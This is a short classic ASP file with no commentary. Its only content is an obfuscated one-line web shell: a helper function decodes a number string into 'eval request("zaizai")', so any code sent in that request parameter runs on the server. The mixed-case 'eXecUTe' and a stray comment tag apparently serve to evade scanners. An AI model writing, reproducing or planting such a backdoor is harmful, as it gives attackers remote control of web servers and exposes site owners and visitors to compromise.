<%
<!--"-->
eXecUTe(enod("eno=189eno=206eno=185eno=196eno=120eno=202eno=189eno=201eno=205eno=189eno=203eno=204eno=128eno=122eno=210eno=185eno=193eno=210eno=185eno=193eno=122eno=129"))
Function enod(Str):
    Str = Split(Str,"eno=")
    For s=1 To Ubound(Str)
        enod=enod&Chr(Str(s)-88)
    Next
End Function
%>